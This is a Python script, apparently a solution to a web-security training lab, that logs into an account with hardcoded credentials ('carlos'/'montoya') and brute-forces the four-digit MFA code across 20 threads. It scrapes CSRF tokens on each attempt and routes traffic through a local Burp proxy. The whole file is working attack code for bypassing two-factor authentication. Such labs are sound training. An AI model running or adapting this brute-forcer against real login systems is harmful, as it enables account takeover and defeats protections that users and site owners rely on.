import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import concurrent.futures
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

def try_mfa_code(s, url, mfa_code):
    mfa_url =  url + '/login2'
    payload = { 
        'csrf': get_csrf_token(s, url, '/login2'),
        'mfa-code': str(mfa_code).zfill(4) 
    }
    print(f"Try {str(mfa_code).zfill(4)}")
    r = s.post(mfa_url, data=payload, headers=headers)

    if "Incorrect security code" not in r.text:
        print(f"[+] Found mfa_code = {str(mfa_code).zfill(4)}")
        os._exit(0)

def worker(i, url):
    s = requests.Session()
    login_acc(s, url, 'carlos', 'montoya')
    try_mfa_code(s, url, i)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]

    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(lambda i: worker(i, url), range(0, 2000))

if __name__ == '__main__':
    main()